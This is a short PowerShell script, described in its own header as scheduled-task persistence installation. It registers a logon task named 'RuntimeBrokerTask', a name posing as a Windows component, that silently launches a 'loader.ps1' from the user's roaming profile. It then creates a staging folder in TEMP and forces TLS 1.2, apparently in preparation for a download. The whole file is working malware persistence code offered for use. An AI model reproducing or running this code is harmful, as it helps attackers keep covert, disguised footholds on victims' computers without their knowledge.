
<#
.SYNOPSIS
    Scheduled-task persistence installation.

.DESCRIPTION
    Registers a per-user logon task that launches a PowerShell
    PowerShell file from the roaming profile.
#>
[CmdletBinding()]
param(
    [string]$TaskName = "RuntimeBrokerTask",
    [string]$ScriptPath = "$env:APPDATA\loader.ps1",
    [int]$StartDelayMinutes = 18
)
$ErrorActionPreference = "Stop"

try {
    $TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "powershell.exe -NoP -File `"$env:APPDATA\loader.ps1`""
    $TaskTrigger = New-ScheduledTaskTrigger -AtLogOn
    $TaskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
    Register-ScheduledTask -TaskName $TaskName -Action $TaskAction -Trigger $TaskTrigger -Settings $TaskSettings -Force -ErrorAction SilentlyContinue
    $TaskState = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
    Write-Verbose ("Task state: " + $TaskState.State)
}
catch {
    Write-Warning "Scheduled-task installation failed: $($_.Exception.Message)"
}

$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
